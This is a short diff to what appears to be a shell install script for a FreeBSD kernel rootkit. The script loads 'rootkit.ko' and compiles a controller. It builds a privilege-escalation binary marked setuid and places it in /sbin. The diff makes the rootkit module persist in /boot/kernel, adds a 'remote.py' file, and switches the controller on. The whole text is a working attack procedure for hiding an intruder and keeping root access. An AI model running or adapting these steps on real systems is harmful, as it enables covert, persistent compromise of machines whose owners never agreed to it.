@@ -5,9 +5,10 @@ make
 kldload ./rootkit.ko
 echo "" > /log.txt
 chmod 666 /log.txt
-mv rootkit.ko /boot/kernel
+cp rootkit.ko /boot/kernel
 cc controller.c -o /sbin/controller
 cc priv_esc.c -o priv_esc
 chmod +s priv_esc
-mv priv_esc /sbin/priv_esc
-#controller on
+cp priv_esc /sbin/priv_esc
+cp remote.py /remote.py
+controller on
